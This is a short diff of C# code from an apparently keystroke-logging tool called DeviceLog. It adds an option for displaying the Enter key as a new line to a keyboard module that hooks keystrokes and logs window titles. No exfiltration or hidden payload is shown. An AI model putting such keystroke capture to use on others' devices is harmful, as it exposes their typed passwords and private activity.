@@ -35,13 +35,14 @@ namespace DeviceLog.Classes.Modules.Keyboard
         /// </summary>
         /// <param name="special">A boolean to indicate whether special keys should be logged or not</param>
         /// <param name="control">A boolean to indicate whether control keys should be logged or not</param>
+        /// <param name="enterKeyNewLine">A boolean to indicate whether the Enter key should be displayed as a new line or not</param>
         /// <param name="keyUp">A boolean to indicate wheter the KeyUp event should be fired or not</param>
         /// <param name="keyDown">A boolean to indicate whether the KeyDown event should be fired or not</param>
         /// <param name="windowTitle">A boolean to indicate whether the currently active window title should be logged or not</param>
         /// <param name="logController">The globally available LogController which holds the repository of logs</param>
-        internal KeyboardModule(bool special, bool control, bool keyUp, bool keyDown, bool windowTitle, LogController logController)
+        internal KeyboardModule(bool special, bool control, bool enterKeyNewLine, bool keyUp, bool keyDown, bool windowTitle, LogController logController)
         {
-            _keyboardHook = new KeyboardHook(special, control);
+            _keyboardHook = new KeyboardHook(special, control, enterKeyNewLine);
             _log = new KeyboardLog();
             _windowModule = new WindowHook();
 
